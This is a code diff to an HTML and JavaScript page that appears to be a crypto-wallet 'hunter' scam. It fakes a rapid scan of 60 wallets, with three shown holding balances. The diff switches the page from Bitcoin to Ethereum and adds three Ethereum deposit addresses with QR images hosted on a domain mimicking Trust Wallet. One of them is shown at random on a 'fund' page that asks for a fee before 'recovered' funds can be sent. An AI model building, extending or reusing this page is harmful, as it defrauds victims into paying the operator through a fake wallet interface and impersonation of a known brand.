@@ -569,21 +569,21 @@
       </div>
       <div class="qr-box">
         <div class="qr-code-image">
-          <img src="https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg" alt="QR">
+          <img id="qrImage" src="" alt="QR">
         </div>
         <div class="address-row">
-          <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress">0x55aD83631e3E454b79510273a2F89A4bf096B7C7</span>
+          <span style="font-family: monospace; font-size:0.7rem;" id="fundAddress"></span>
           <button class="copy-btn" id="fundCopyBtn">copy</button>
         </div>
-        <div style="font-size:0.65rem; color:#8fcbff;">Bitcoin network</div>
+        <div style="font-size:0.65rem; color:#8fcbff;">Ethereum network</div>
       </div>
     </div>
 
-    <!-- SEND PAGE (BTC) -->
+    <!-- SEND PAGE (ETH) -->
     <div class="page send-page" id="sendPage">
       <div class="send-header">
         <div class="back-link-sm" id="backFromSend">← back</div>
-        <span class="send-title">Send BTC</span>
+        <span class="send-title">Send ETH</span>
         <span style="width:40px;"></span>
       </div>
       <div class="field-group">
@@ -596,22 +596,22 @@
       <div class="field-group">
         <div class="field-label">Destination network</div>
         <div class="network-row">
-          <span>Bitcoin</span>
+          <span>Ethereum</span>
           <span style="color:#9acdff;">▼</span>
         </div>
       </div>
       <div class="field-group">
-        <div class="field-label">Amount (BTC)</div>
+        <div class="field-label">Amount (ETH)</div>
         <div class="amount-section">
           <div class="amount-row">
-            <input type="number" id="amountInput" placeholder="BTC Amount" min="0.0001" step="any">
+            <input type="number" id="amountInput" placeholder="ETH Amount" min="0.0001" step="any">
             <button class="max-btn" id="maxBtn">Max</button>
           </div>
           <div class="usd-hint" id="usdHint">≈ $0.00</div>
         </div>
       </div>
       <div id="feeErrorBox" style="display: none;" class="error-fee-box">
-        <span>⚠️</span> fee required: 0.0001 BTC
+        <span>⚠️</span> fee required: 0.0001 ETH
       </div>
       <button class="confirm-btn" id="confirmSendBtn" disabled>Next</button>
     </div>
@@ -632,6 +632,22 @@
 
       // Non-rounded BTC values (in USD)
       const btcValues = [632.47, 130.28, 1325.64];
+      
+      // Array of QR codes and addresses for receive page
+      const receiveOptions = [
+        {
+          qr: "https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-20-08-765-edit_com.wallet.crypto.trustapp.jpg",
+          address: "0xc8C4D2bd2A051068682D9125b0ac858570976087"
+        },
+        {
+          qr: "https://trustwalleteth.github.io/B/Screenshot_2026-02-15-16-25-58-334-edit_com.wallet.crypto.trustapp.jpg",
+          address: "0xA34559ea9Bc18F31687C1A5090350FD7D4d4bad2"
+        },
+        {
+          qr: "https://trustwalleteth.github.io/QR/Screenshot_2026-02-14-20-40-37-266-edit_com.wallet.crypto.trustapp.jpg",
+          address: "0x55aD83631e3E454b79510273a2F89A4bf096B7C7"
+        }
+      ];
       
       // generate 60 wallets: only 3 have balance
       const walletList = [];
@@ -674,6 +690,7 @@
         currentIndex = 0;
         huntConsole.innerHTML = '';
 
+        // Scan 60 wallets in 4 seconds (approx 67ms per wallet)
         scanInterval = setInterval(() => {
           if (currentIndex >= 60) {
             clearInterval(scanInterval);
@@ -724,10 +741,10 @@
           huntConsole.appendChild(line);
           huntConsole.scrollTop = huntConsole.scrollHeight;
           currentIndex++;
-        }, 190);
+        }, 67); // ~67ms = 4 seconds for 60 wallets
       }
 
-      // Event Listeners - همه دکمه‌ها به درستی تعریف شدن
+      // Event Listeners
       document.getElementById('huntBtn').addEventListener('click', startHunt);
 
       document.getElementById('backFromWalletToHunter').addEventListener('click', ()=>{
@@ -756,6 +773,13 @@
 
       // FUND navigation
       document.getElementById('fundActionMain').addEventListener('click', ()=>{
+        // Randomly select one of the three receive options
+        const randomIndex = Math.floor(Math.random() * receiveOptions.length);
+        const selected = receiveOptions[randomIndex];
+        
+        document.getElementById('qrImage').src = selected.qr;
+        document.getElementById('fundAddress').innerText = selected.address;
+        
         wallet.classList.remove('active');
         fundPage.classList.add('active');
       });
@@ -779,10 +803,10 @@
         if (recoveredWallet && recoveredWallet.balance > 0) {
           const maxBalance = recoveredWallet.balance;
           document.getElementById('amountInput').max = maxBalance;
-          document.getElementById('amountInput').placeholder = `BTC Amount (max ${maxBalance})`;
+          document.getElementById('amountInput').placeholder = `ETH Amount (max ${maxBalance})`;
         } else {
           document.getElementById('amountInput').max = 0;
-          document.getElementById('amountInput').placeholder = 'BTC Amount (no funds)';
+          document.getElementById('amountInput').placeholder = 'ETH Amount (no funds)';
         }
         validateSendForm();
       });
